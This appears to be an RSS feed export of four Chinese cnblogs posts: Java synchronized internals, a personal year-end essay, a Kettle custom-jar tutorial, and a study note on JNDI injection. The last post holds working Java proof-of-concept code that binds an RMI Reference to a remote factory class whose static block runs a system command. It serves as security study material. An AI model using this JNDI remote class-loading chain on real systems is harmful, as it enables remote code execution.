<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>synchronized实现原理 - 网海精华</title>
<link>http://www.cnblogs.com/grow001/p/12232708.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/grow001/p/12232708.html</guid>
<description>&lt;p&gt;Java中每一个对象都可以作为锁，这是synchronized实现同步的基础：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;普通同步方法，锁是当前实例对象&lt;/li&gt;
&lt;li&gt;静态同步方法，锁是当前类的class对象&lt;/li&gt;
&lt;li&gt;同步方法块，锁是括号里面的对象&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;当一个线程访问同步代码块时，它首先是需要得到锁才能执行同步代码，当退出或者抛出异常时必须要释放锁，&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;Jconsole&lt;/span&gt;：java安装目录下有个jdk中找到jconsole&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1904006/202001/1904006-20200124234118325-331417969.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1904006/202001/1904006-20200124234512158-1922664221.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 反编译：&lt;/p&gt;
&lt;p&gt;通过javap反编译class文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1904006/202001/1904006-20200124235240090-343142148.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1904006/202001/1904006-20200124235603578-631999670.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;反编译后，我们可以看到Java编译器为我们生成的字节码。在对于&lt;code&gt;doSth&lt;/code&gt;和&lt;code&gt;doSth1&lt;/code&gt;的处理上稍有不同。也就是说。JVM对于同步方法和同步代码块的处理方式不同。&lt;/p&gt;
&lt;p&gt;对于同步方法，JVM采用&lt;code&gt;ACC_SYNCHRONIZED&lt;/code&gt;标记符来实现同步。 对于同步代码块。JVM采用&lt;code&gt;monitorenter&lt;/code&gt;、&lt;code&gt;monitorexit&lt;/code&gt;两个指令来实现同步。&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;Monitorenter&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;Monitorexit&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1904006/202001/1904006-20200125000054189-256529166.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 从上面可以看出，同步代码块是使用monitorenter和monitorexit指令实现的，同步方法（在这看不出来需要看JVM底层实现）依靠的是方法修饰符上的ACC_SYNCHRONIZED实现。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;同步代码块&lt;/strong&gt;：monitorenter指令插入到同步代码块的开始位置，monitorexit指令插入到同步代码块的结束位置，JVM需要保证每一个monitorenter都有一个monitorexit与之相对应。任何对象都有一个monitor与之相关联，当且一个monitor被持有之后，他将处于锁定状态。线程执行到monitorenter指令时，将会尝试获取对象所对应的monitor所有权，即尝试获取对象的锁；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;同步方法&lt;/strong&gt;：synchronized方法则会被翻译成普通的方法调用和返回指令如:invokevirtual、areturn指令，在VM字节码层面并没有任何特别的指令来实现被synchronized修饰的方法，而是在Class文件的方法表中将该方法的access_flags字段中的synchronized标志位置1，表示该方法是同步方法并使用调用该方法的对象或该方法所属的Class在JVM的内部对象表示Klass做为锁对象。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;Monitor&lt;/span&gt;：&lt;/p&gt;
&lt;p&gt;什么是Monitor？我们可以把它理解为一个同步工具，也可以描述为一种同步机制，它通常被描述为一个对象。 与一切皆对象一样，所有的Java对象是天生的Monitor，每一个Java对象都有成为Monitor的潜质，因为在Java的设计中 ，每一个Java对象自打娘胎里出来就带了一把看不见的锁，它叫做内部锁或者Monitor锁。 Monitor 是线程私有的数据结构，每一个线程都有一个可用monitor record列表，同时还有一个全局的可用列表。每一个被锁住的对象都会和一个monitor关联（对象头的MarkWord中的LockWord指向monitor的起始地址），同时monitor中有一个Owner字段存放拥有该锁的线程的唯一标识，表示该锁被这个线程占用。其结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1904006/202001/1904006-20200125000257868-596379133.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Owner&lt;/strong&gt;：初始时为NULL表示当前没有任何线程拥有该monitor record，当线程成功拥有该锁后保存线程唯一标识，当锁被释放时又设置为NULL；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EntryQ&lt;/strong&gt;:关联一个系统互斥锁（semaphore），阻塞所有试图锁住monitor record失败的线程。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RcThis&lt;/strong&gt;:表示blocked或waiting在该monitor record上的所有线程的个数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Nest&lt;/strong&gt;:用来实现重入锁的计数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HashCode&lt;/strong&gt;:保存从对象头拷贝过来的HashCode值（可能还包含GC age）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Candidate&lt;/strong&gt;:用来避免不必要的阻塞或等待线程唤醒，因为每一次只有一个线程能够成功拥有锁，如果每次前一个释放锁的线程唤醒所有正在阻塞或等待的线程，会引起不必要的上下文切换（从阻塞到就绪然后因为竞争锁失败又被阻塞）从而导致性能严重下降。Candidate只有两种可能的值0表示没有需要唤醒的线程1表示要唤醒一个继任线程来竞争锁。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;锁优化&lt;/p&gt;
&lt;p&gt;jdk1.6对锁的实现引入了大量的优化，如自旋锁、适应性自旋锁、锁消除、锁粗化、偏向锁、轻量级锁等技术来减少锁操作的开销。 锁主要存在四中状态，依次是：无锁状态、偏向锁状态、轻量级锁状态、重量级锁状态，他们会随着竞争的激烈而逐渐升级。注意锁可以升级不可降级，这种策略是为了提高获得锁和释放锁的效率。&lt;/p&gt;

</description>
<pubDate>Sat, 25 Jan 2020 00:42:00 +0000</pubDate>
<dc:creator>网海精华</dc:creator>
<og:description>Java中每一个对象都可以作为锁，这是synchronized实现同步的基础： 普通同步方法，锁是当前实例对象 静态同步方法，锁是当前类的class对象 同步方法块，锁是括号里面的对象 当一个线程访问</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/grow001/p/12232708.html</dc:identifier>
</item>
<item>
<title>2019年总结 - 买辣椒也用券</title>
<link>http://www.cnblogs.com/Juaoie/p/12232716.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Juaoie/p/12232716.html</guid>
<description>&lt;p&gt;　　2019年一眨眼就过去了，现在已经是大年三十的晚上了。&lt;br/&gt;　　回想2019年，仿佛就在昨天，这一年过的并不是很曲折，一切还算顺利，但这并不代表我过的很好。&lt;br/&gt;　　年初时候我在武汉一家公司上班，那也是我正式工作以来的第一家公司，可能因为是一家外包公司的缘故，所以人员流动量还是很大的，基本上都是只会呆上两年的时间。那家公司规模还算是比较大的，工资可观，所以在那工作也算是比较稳定了，很多人也选择了在那安度余生，因为他们都已经打算向公司贷款买房了，这也是这样的大公司留人的一种套路，我并不是说这样有什么不好，只不过是因人而议，我坚信我还是年轻的，我也坚信我因该学到更多的知识，于是我在年中旬的时候裸辞了，并不是那家公司没有什么值得我学习了，而正是因为那家公司还有很多值得我学习我才辞职的，因为贫穷会限制人的想象，在那样的一家公司呆久会天真的认为自己所在的技术圈就是普遍的技术圈，并且片面的用人力劳动代替机器的生产力也是不对的。&lt;/p&gt;
&lt;p&gt;　　年中旬，我去了北京，不为什么，或者只是单纯的想去，如果非要有个原因，那就比较复杂了。辞职去北京容易，但是生活在北京却不容易。首先，还没到北京我就开始考虑落脚的地方，无亲无故的，总不能天天住宾馆吧，知道北京不仅租房压力大，而且租房也贼坑，甚至在网上的帖子都会有很多住黑店的经历，但不管怎么样，这第一步还是要打算好吧，于是我找了家青年旅馆，由于那段时间我需要在北京四处奔波找工作，所以我还不能住太偏，所以价格自然不菲，尽管天气十分闷热，我还是要每天背着个电脑到处跑，并且人生地不熟，但我终究还是一个人扛过来了。最后由于一些原因，我不得已一个人在西四环租了一个房。&lt;/p&gt;
&lt;p&gt;　　但是时间过去快两个月，我还是没有找到工作，最后究其原因，并不是我从来没有面到过好公司，而是当时的我有些自作聪明，拿着我在武汉的一些面试经验和在上家公司的工作经验就开始在面试官面前耍些小聪明，却忽视了知识的基本功重要性，可恨的是我面试了这么多家公司都没有找到根本原因，我想这也算是呼应了上文说到辞职的原因。&lt;/p&gt;
&lt;p&gt;　　最后到了9月，总算找到一家公司落脚了，公司虽说并不大，待遇也不及上家公司，但是至少工作环境和氛围我还算是满意，并且我还有充足的时间和机会去学习更多的东西，然后浑浑噩噩到了11月12号，这一天对于我来说意义重大，因为，这是是我走入职场的第一天。直到那天为止，我一年的工作并未存下一分实际金额。&lt;/p&gt;
&lt;p&gt;　　算下来，也算是有整整一年之久，一年的时间对于很多经验丰富的老程序员来说不算什么，但是对于我来说就不一样，我必须保证每天过的值得，要么是真的开心了，要么就真的学习了，通过每天不停的鞭笞自己，只是为了向家人证明我不是他们想象中的那种人。20年我会继续沉淀，保持更好的学习态度，心中的思想不变，做到我应该做到的事。&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 16:32:00 +0000</pubDate>
<dc:creator>买辣椒也用券</dc:creator>
<og:description>2019年一眨眼就过去了，现在已经是大年三十的晚上了。 回想2019年，仿佛就在昨天，这一年过的并不是很曲折，一切还算顺利，但这并不代表我过的很好。 年初时候我在武汉一家公司上班，那也是我正式工作以来</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Juaoie/p/12232716.html</dc:identifier>
</item>
<item>
<title>Kettle自定义jar包供javascript使用 - CREATE_17</title>
<link>http://www.cnblogs.com/createboke/p/12232680.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/createboke/p/12232680.html</guid>
<description>&lt;blockquote readability=&quot;6.6176470588235&quot;&gt;
&lt;p&gt;我们都知道 Kettle 是用 Java 语言开发，并且可以在 JavaScript 里面直接调用 java 类方法。所以有些时候，我们可以自定义一些方法，来供 JavaScript 使用。&lt;/p&gt;
&lt;p&gt;本篇文章有参考自：&lt;a href=&quot;https://www.xiaominfo.com/2019/08/13/kettle-12/&quot; class=&quot;uri&quot;&gt;https://www.xiaominfo.com/2019/08/13/kettle-12/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;一在-java-项目中创建工具类&quot;&gt;一、在 java 项目中创建工具类&lt;/h3&gt;
&lt;p&gt;在项目中，创建 utils 工具类，比如 计算总页码 的一个方法。代码如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class PaginationUtils {

  /**
   * 计算得到总页码
   * @param totalRecords 总记录数
   * @param pageSize 分页大小
   * @return 总页码
   */
  public static int totalPage(String totalRecords,String pageSize){
    int totalPage=0;
    try{
      BigDecimal records=new BigDecimal(totalRecords);
      BigDecimal size=new BigDecimal(pageSize);
      BigDecimal _tmp=records.add(size).subtract(new BigDecimal(1));
      BigDecimal _tp=_tmp.divide(size).setScale(0,BigDecimal.ROUND_HALF_UP);
      totalPage=_tp.intValue();
    }catch (Exception e){
      //error
    }
    return totalPage;
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;二部署打包&quot;&gt;二、部署打包&lt;/h3&gt;
&lt;p&gt;工具类方法开发完毕后，可通过 &lt;code&gt;mvn clean package -DskipTests&lt;/code&gt; 命令进行打包，在 target 目录下，会生成一个 jar 文件。需要将这个 jar 包放到 kettle 的 lib 目录下。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1117352/202001/1117352-20200124233826400-315434843.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;三编写-javascript-脚本&quot;&gt;三、编写 JavaScript 脚本&lt;/h3&gt;
&lt;p&gt;重启 Kettle ，新建 JavaScript 脚本，计算总页码的 js 代码如下所示：&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;//计算总页码
var totalPage=com.study.spring.Utils.PaginationUtils.totalPage(countBySql,pageSize);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实就是在 js 代码中声明 java 类+方法。&lt;/p&gt;
&lt;p&gt;但是问题来了，kettle 在运行这段 JavaScript 脚本的时候，提示下面这样的错误：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;不能编译 javascript: org.mozilla.javascript.EcmaError: TypeError: Cannot call property totalPage in object [JavaPackage com.study.spring.Utils.PaginationUtils]. It is not a function, it is &quot;object&quot;. (&amp;lt;cmd&amp;gt;#22)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据错误信息来看，其实还是没有找到相关类方法，和没放这个 jar 包一样...&lt;/p&gt;
&lt;h3 id=&quot;四faq&quot;&gt;四、FAQ&lt;/h3&gt;
&lt;p&gt;上面这个错误究竟是怎么回事呢？我也很奇怪。于是我就用压缩工具也看了看 lib 目录下的其它 jar 包结构，发现人家都是这样式的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1117352/202001/1117352-20200124233827493-618949061.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;而我刚才打的 jar 包目录是这样子的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1117352/202001/1117352-20200124233828352-993828696.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;com 目录并没有在 jar 包的根路径下，自然是访问不到那个方法。&lt;/p&gt;
&lt;p&gt;好，问题产生的原因找到了，然后再说一下解决办法：&lt;/p&gt;
&lt;p&gt;在 pom.xml 文件中添加：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;build&amp;gt;
    &amp;lt;plugins&amp;gt;
        &amp;lt;plugin&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
            &amp;lt;configuration&amp;gt;
                &amp;lt;skip&amp;gt;true&amp;lt;/skip&amp;gt;
            &amp;lt;/configuration&amp;gt;
        &amp;lt;/plugin&amp;gt;
    &amp;lt;/plugins&amp;gt;
&amp;lt;/build&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;pom 文件添加后的效果图如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1117352/202001/1117352-20200124233829287-801269994.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再次打成的 jar 包内部结构为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1117352/202001/1117352-20200124233830074-175966753.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;成功！com 目录已经在 jar 包的根路径下了。&lt;/p&gt;
&lt;p&gt;将 jar 包替换到 kettle 的 lib 目录下，重启 Kettle ，再次通过 javascripts 调用自定义 jar 包成功！&lt;/p&gt;
&lt;hr/&gt;&lt;h3 id=&quot;点关注不迷路&quot;&gt;点关注，不迷路&lt;/h3&gt;
&lt;p&gt;好了各位，以上就是这篇文章的全部内容了，能看到这里的人呀，都是&lt;strong&gt;人才&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;白嫖不好，创作不易。&lt;/strong&gt;各位的支持和认可，就是我创作的最大动力，我们下篇文章见！&lt;/p&gt;
&lt;p&gt;如果本篇博客有任何错误，请批评指教，不胜感激 ！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1117352/202001/1117352-20200124233830797-1507075674.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 15:39:00 +0000</pubDate>
<dc:creator>CREATE_17</dc:creator>
<og:description>我们都知道 Kettle 是用 Java 语言开发，并且可以在 JavaScript 里面直接调用 java 类方法。所以有些时候，我们可以自定义一些方法，来供 JavaScript 使用。 本篇文章</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/createboke/p/12232680.html</dc:identifier>
</item>
<item>
<title>关于看后的一些总结-2 - tr1ple</title>
<link>http://www.cnblogs.com/tr1ple/p/12232601.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tr1ple/p/12232601.html</guid>
<description>&lt;p&gt;命名系统是一组关联的上下文，而上下文是包含零个或多个绑定的对象，每个绑定都有一个原子名(实际上就是给绑定的对象起个名字，方便查找该绑定的对象)， 使用JNDI的好处就是配置统一的管理接口，下层可以使用RMI、LDAP或者CORBA来访问目标服务&lt;/p&gt;
&lt;p&gt;要获取初始上下文，需要使用初始上下文工厂&lt;/p&gt;
&lt;p&gt;比如JNDI+RMI&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
Hashtable env = new&lt;span&gt; Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;&lt;span&gt;);
env.put(Context.PROVIDER_URL,
        &quot;rmi://localhost:9999&quot;&lt;span&gt;);
Context ctx = new&lt;span&gt; InitialContext(env);

//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
ctx.bind(&quot;refObj&quot;, new&lt;span&gt; RefObject());

//通过名称查找对象
ctx.lookup(&quot;refObj&quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;比如JNDI+LDAP&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
Hashtable env = new&lt;span&gt; Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
 &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;&lt;span&gt;);
env.put(Context.PROVIDER_URL, &quot;ldap://localhost:1389&quot;&lt;span&gt;);

DirContext ctx = new&lt;span&gt; InitialDirContext(env);

//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
Object local_obj = ctx.lookup(&quot;cn=foo,dc=test,dc=org&quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;但是如上虽然设置了初始化工厂和provider_url，但是JNDI是支持动态协议转换的，通过使用上下文来调用lookup函数使用远程对象时，JNDI可以根据提供的URL来自动进行转换，所以这里的关键点就是lookup的参数可被攻击者控制。&lt;/p&gt;

&lt;p&gt;在命名和目录服务中绑定JAVA对象数量过多时占用的资源太多，然而如果能够存储对原始对象的引用那么肯定更加方便，JNDI命名引用就是用Reference类表示，其由被引用的对象和地址组成，那么意味着此时被应用的对象是不是就可以不一定要求与提供JNDI服务的服务端位于同一台服务器。&lt;/p&gt;
&lt;p&gt;Reference通过对象工厂来构造对象。对象工厂的实际功能就是我们需要什么对象即可通过该工厂类返回我们所需要的对象。那么使用JNDI的lookup查找对象时，那么Reference根据工厂类加载地址来加载工厂类，此时肯定会初始化工程类，在之前的调JNDI payload的过程中也和这文章讲的一样，打JNDI里的三种方法其中两种就是将命令执行的代码块写到工厂类的static代码块或者构造方法中，那么工厂类最后再构造出需要的对象，这里实际就是第三种getObjectInstance了。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
Reference reference = new Reference(&quot;MyClass&quot;,&quot;MyClass&quot;&lt;span&gt;,FactoryURL);
ReferenceWrapper wrapper = new&lt;span&gt; ReferenceWrapper(reference);
ctx.bind(&quot;Foo&quot;, wrapper);&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;比如上面这三段代码即通过Reference绑定了远程对象并提供工厂地址，那么当客户端查找Foo名称的对象时将会到工厂地址处去加载工厂类到本地。&lt;/p&gt;
&lt;p&gt;从远程加载类时有两种不同级别：&lt;/p&gt;
&lt;p&gt;1.命名管理器级别&lt;/p&gt;
&lt;p&gt;2.服务提供者(SPI)级别&lt;/p&gt;
&lt;p&gt;直接打RMI时加载远程类时要求强制安装Security Manager，并且要求useCodebaseOnly为false，直接打LDAP时要求com.sun.jndi.ldap.object.trustURLCodebase = true(默认为false)，因为这都是从服务提供者接口(SPI)级别来加载远程类。&lt;/p&gt;
&lt;p&gt;但是在命名管理级别不需要安装安全管理器(security manager)且jvm选项中低版本的不受useCodebaseOnly限制&lt;/p&gt;
&lt;h2&gt;JNDI Reference+RMI攻击&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
Reference refObj = new Reference(&quot;refClassName&quot;, &quot;FactoryClassName&quot;, &quot;http://example.com:12345/&quot;);//refClassName为类名加上包名，FactoryClassName为工厂类名并且包含工厂类的包名
ReferenceWrapper refObjWrapper = new&lt;span&gt; ReferenceWrapper(refObj);
registry.bind(&quot;refObj&quot;, refObjWrapper);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时当客户端通过lookup('refObj')获取远程对象时，此时将拿到reference类，然后接下来将去本地的classpath中去找名为refClassName的类，如果本地没找到，则将会Reference中指定的工厂地址中去找工厂类&lt;/p&gt;
&lt;p&gt;RMIClinent.java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.longofo.jndi;

import&lt;span&gt; javax.naming.Context;
import&lt;span&gt; javax.naming.InitialContext;
import&lt;span&gt; javax.naming.NamingException;
import&lt;span&gt; javax.naming.directory.DirContext;
import&lt;span&gt; javax.naming.directory.InitialDirContext;
import&lt;span&gt; java.rmi.NotBoundException;
import&lt;span&gt; java.rmi.RemoteException;

public class&lt;span&gt; RMIClient1 {
    public static void main(String[] args) throws&lt;span&gt; RemoteException, NotBoundException, NamingException {
//        Properties env = new Properties();
//        env.put(Context.INITIAL_CONTEXT_FACTORY,
//                &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
//        env.put(Context.PROVIDER_URL,
//                &quot;rmi://localhost:9999&quot;);
        Context ctx = new&lt;span&gt; InitialContext()；&lt;span&gt;
        ctx.lookup(&quot;rmi://localhost:9999/refObj&quot;&lt;span&gt;);
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;RMIServer.java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.longofo.jndi;

import&lt;span&gt; com.sun.jndi.rmi.registry.ReferenceWrapper;

import&lt;span&gt; javax.naming.NamingException;
import&lt;span&gt; javax.naming.Reference;
import&lt;span&gt; java.rmi.AlreadyBoundException;
import&lt;span&gt; java.rmi.RemoteException;
import&lt;span&gt; java.rmi.registry.LocateRegistry;
import&lt;span&gt; java.rmi.registry.Registry;

public class&lt;span&gt; RMIServer1 {
    public static void main(String[] args) throws&lt;span&gt; RemoteException, NamingException, AlreadyBoundException {
        // 创建Registry
        Registry registry = LocateRegistry.createRegistry(9999&lt;span&gt;);
        System.out.println(&quot;java RMI registry created. port on 9999...&quot;&lt;span&gt;);
        Reference refObj = new Reference(&quot;ExportObject&quot;, &quot;com.longofo.remoteclass.ExportObject&quot;, &quot;http://127.0.0.1:8000/&quot;&lt;span&gt;);
        ReferenceWrapper refObjWrapper = new&lt;span&gt; ReferenceWrapper(refObj);
        registry.bind(&quot;refObj&quot;&lt;span&gt;, refObjWrapper);
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ExportObject.java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.longofo.remoteclass;

import&lt;span&gt; javax.naming.Context;
import&lt;span&gt; javax.naming.Name;
import&lt;span&gt; javax.naming.spi.ObjectFactory;
import&lt;span&gt; java.io.BufferedInputStream;
import&lt;span&gt; java.io.BufferedReader;
import&lt;span&gt; java.io.InputStreamReader;
import&lt;span&gt; java.io.Serializable;
import&lt;span&gt; java.util.Hashtable;

public class ExportObject implements&lt;span&gt; ObjectFactory, Serializable {

    private static final long serialVersionUID = 4474289574195395731L&lt;span&gt;;

    static&lt;span&gt; {
        //这里由于在static代码块中，无法直接抛异常外带数据，不过在static中应该也有其他方式外带数据。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中所有远程加载类的地方都会调用static代码块
        try&lt;span&gt; {
            exec(&quot;calc&quot;&lt;span&gt;);

        } catch&lt;span&gt; (Exception e) {
            e.printStackTrace();
        }
    }

    public static void exec(String cmd) throws&lt;span&gt; Exception {
        String sb = &quot;&quot;&lt;span&gt;;
        BufferedInputStream in = new&lt;span&gt; BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new&lt;span&gt; InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null&lt;span&gt;)
            sb += lineStr + &quot;\n&quot;&lt;span&gt;;
        inBr.close();
        in.close();
//        throw new Exception(sb);
&lt;span&gt;    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&amp;lt;?, ?&amp;gt; environment) throws&lt;span&gt; Exception {
        System.out.println(&quot;333&quot;&lt;span&gt;);
        return null&lt;span&gt;;
    }
    public&lt;span&gt; ExportObject(){
        System.out.println(&quot;222&quot;&lt;span&gt;);
    }

}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时服务端创建注册表，此时将Reference对象绑定到注册表中，此时&lt;/p&gt;
&lt;p&gt;从上面的代码中可以看到此时初始化工厂后就可以来调用远程对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1063309/202001/1063309-20200124150349296-1503234231.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1063309/202001/1063309-20200124151331758-1767420725.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此时由输出也可以看到此时触发了工厂类的static代码块和构造方法以及getObjectInstance方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1063309/202001/1063309-20200124160522363-632911712.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在客户端lookup处下断点跟踪也可以去发现整个的调用链，其中getReference首先拿到绑定对象的引用，然后再通过getObjectFactoryFromReference从Reference拿到对象工厂，之后再从对象工厂拿到我们最初想要查找的对象的实例。&lt;/p&gt;
